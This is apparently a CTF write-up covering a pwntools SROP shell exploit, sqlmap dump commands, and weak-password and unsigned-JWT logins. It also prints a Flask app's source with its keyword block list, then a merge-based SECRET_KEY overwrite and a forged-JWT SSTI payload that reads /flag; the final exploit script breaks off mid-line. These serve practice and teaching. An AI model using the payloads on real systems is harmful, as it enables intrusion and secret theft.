<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011140719018.png" alt="image-20251011140719018"></p>
<h3 id="Easy-syscall"><a href="#Easy-syscall" class="headerlink" title="Easy-syscall"></a>Easy-syscall</h3><p>打SROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./pwn&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = constants.SYS_execve</span><br><span class="line">    frame.rdi = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">    frame.rsi = <span class="number">0</span></span><br><span class="line">    frame.rdx = <span class="number">0</span></span><br><span class="line">    frame.rsp = elf.bss() + <span class="number">0x800</span></span><br><span class="line">    frame.rip = elf.sym[<span class="string">&quot;magic&quot;</span>] + <span class="number">0xF</span> </span><br><span class="line"></span><br><span class="line">    frame_bytes = <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">b&quot;A&quot;</span> * <span class="number">48</span>,</span><br><span class="line">            frame_bytes[:<span class="number">8</span>],           </span><br><span class="line">            p64(elf.sym[<span class="string">&quot;magic&quot;</span>]),</span><br><span class="line">            frame_bytes[<span class="number">8</span>:],</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path, stdin=PIPE, stdout=PIPE)</span><br><span class="line">    host = args.HOST <span class="keyword">or</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">57192</span>)</span><br><span class="line">    <span class="keyword">return</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = connect()</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;hidden here...\n&quot;</span>)</span><br><span class="line">    io.send(build_payload())</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141020356.png" alt="image-20251011141020356"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EZ-SQL"><a href="#EZ-SQL" class="headerlink" title="EZ_SQL"></a>EZ_SQL</h3><p>sqlmap一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id --batch --random-agent --threads=5 --level=3 --risk=2 --dbs --banner --current-user</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome --tables --batch --union-cols=3</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome -T flag --columns --batch --union-cols=3</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:61945/&quot; --data=&quot;id=2&quot; -p id -D welcome -T flag --dump --batch --union-cols=3</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141705666.png" alt="image-20251011141705666"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141757578.png" alt="image-20251011141757578"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011141935919.png" alt="image-20251011141935919"></p>
<h3 id="EZ-Login（签到"><a href="#EZ-Login（签到" class="headerlink" title="EZ_Login（签到)"></a>EZ_Login（签到)</h3><p>密码是simple 弱密码爆破</p>
<p>本地管理员要求xff 127.0.0.1</p>
<p>进去后解码 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJmbGFnIjoiVFNDVEYtSnt3MzFjMG0zXzcwXzdoM193MzhfajB1cm4zeX0ifQ.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;w31c0m3_70_7h3_w38_j0urn3y&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h3><p>访问127.0.0.1:druid&#x2F;v2&#x2F;sql</p>
<p>密码也是admin</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011144836197.png" alt="image-20251011144836197"></p>
<h3 id="EZ-PY"><a href="#EZ-PY" class="headerlink" title="EZ_PY"></a>EZ_PY</h3><p>提示source</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:58379/source</span><br></pre></td></tr></table></figure>

<p>拿到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template_string</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">24</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户数据库</span></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;c1432&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_response</span>(<span class="params">message: <span class="built_in">str</span>, code: <span class="built_in">int</span> = <span class="number">200</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Unified response format&quot;&quot;&quot;</span></span><br><span class="line">    resp = &#123;<span class="string">&#x27;message&#x27;</span>: message&#125;</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        resp[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf_filter</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> input_str:</span><br><span class="line">        <span class="keyword">return</span> input_str</span><br><span class="line">    input_str = <span class="built_in">str</span>(input_str)</span><br><span class="line">    dangerous_strings = [</span><br><span class="line">        <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;bases&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;write&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#123;%&#x27;</span>, <span class="string">&#x27;%&#125;&#x27;</span>, <span class="string">&#x27;&#123;#&#x27;</span>, <span class="string">&#x27;#&#125;&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> string <span class="keyword">in</span> dangerous_strings:</span><br><span class="line">        <span class="keyword">if</span> string <span class="keyword">in</span> input_str:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WAF blocked: Dangerous pattern detected&quot;</span></span><br><span class="line"></span><br><span class="line">    filtered = input_str.replace(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;javascript:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;onload=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filtered = filtered.replace(<span class="string">&#x27;onerror=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hello&quot;</span> <span class="keyword">in</span> filtered:</span><br><span class="line">        filtered = filtered.replace(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hacker&quot;</span> <span class="keyword">in</span> filtered:</span><br><span class="line">        filtered = filtered.replace(<span class="string">&quot;hacker&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filtered</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, role=<span class="string">&#x27;user&#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.role = role</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">f</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">f</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&#x27;Authorization token is required.&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = token.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]  <span class="comment"># 提取令牌，假设格式为 &#x27;Bearer &lt;token&gt;&#x27;</span></span><br><span class="line">            data = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">            current_user = data[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">            role = data[<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">f&#x27;Invalid token: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> f(current_user, role, *args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    user = User()</span><br><span class="line">    merge(data, user)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user.username <span class="keyword">or</span> <span class="keyword">not</span> user.password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    users[user.username] = user.password</span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Registration successful.&#x27;</span>, <span class="number">201</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    auth = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> auth:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    username = auth.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = auth.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Username and password are required.&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username) != password:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&#x27;Invalid username or password.&#x27;</span>, <span class="number">401</span>)</span><br><span class="line">    token = jwt.encode(</span><br><span class="line">        &#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;,</span><br><span class="line">        app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>],</span><br><span class="line">        algorithm=<span class="string">&quot;HS256&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/protected&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected</span>(<span class="params">current_user, role</span>):</span><br><span class="line">    <span class="keyword">if</span> role != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(</span><br><span class="line">            <span class="string">f&#x27;Access denied: User <span class="subst">&#123;current_user&#125;</span> (<span class="subst">&#123;role&#125;</span>) does not have sufficient privileges.&#x27;</span>,</span><br><span class="line">            <span class="number">403</span></span><br><span class="line">        )</span><br><span class="line">    filtered_user = waf_filter(current_user)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(</span><br><span class="line">        <span class="string">f&quot;Hello, <span class="subst">&#123;filtered_user&#125;</span>! You have access to this protected resource.&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/index.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_page</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/register.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/success&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success_page</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;source/success.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>merge 在 register 请求体上递归地对 User 对象和其类做任意属性赋值，可以一路改写 User.<em>init</em>_.<strong>globals</strong>[‘app’].config[‘SECRET_KEY’]，从而把随机密钥换成指定的值；之后就能自己签发 JWT。</p>
<p>waf_filter 只做字符串替换，hello→，其黑名单又可以用字符串拼接和 %c 生成函数绕过，因此可以把用户名字段变成任意 Jinja 表达式并触发 SSTI</p>
<p>先把密钥改成已知值如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            &quot;username&quot;: &quot;attacker&quot;,</span><br><span class="line">            &quot;password&quot;: &quot;pass&quot;,</span><br><span class="line">            &quot;__class__&quot;: &#123;</span><br><span class="line">              &quot;__init__&quot;: &#123;</span><br><span class="line">                &quot;__globals__&quot;: &#123;</span><br><span class="line">                  &quot;app&quot;: &#123;</span><br><span class="line">                    &quot;config&quot;: &#123;</span><br><span class="line">                      &quot;SECRET_KEY&quot;: &quot;mysecret&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新密钥签一个 role 为 admin 的 JWT，并把 user 字段写成绕过 WAF 的模板表达式。示例载荷会把 __globals__、__builtins__、open、read、flag 等关键字拆成字符串拼接与 %c 生成，从而读取 /flag</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGVsbG8gKCgobGlwc3VtfGF0dHIoJ19fJyB-ICgnJWMnJTEwMykgfiAnbG9iYWxzX18nKSlbJ19fYnVpbCcgfiAndGluc19fJ11bJ28nIH4gJ3BlbiddKCcvJyB-ICdmbGEnIH4gKCclYyclMTAzKSkpfGF0dHIoJ3JlJyB-</span><br><span class="line">  ICdhZCcpKCkpIGhhY2tlciIsInJvbGUiOiJhZG1pbiJ9.scA4Rp1MLiXDPPu-ye8xGkgaBtC-HTJ2iILqY7mKoVQ</span><br></pre></td></tr></table></figure>

<p>这里 hello … hacker 在过滤后会变成 ，表达式利用 lipsum 的全局字典拿到 open(‘&#x2F;fla’ ~ ‘%c’%103) 并调用 read()。携带该令牌访问受保护接口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:58379&quot;</span></span><br><span class="line">SECRET = <span class="string">&quot;mysecret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64url</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span 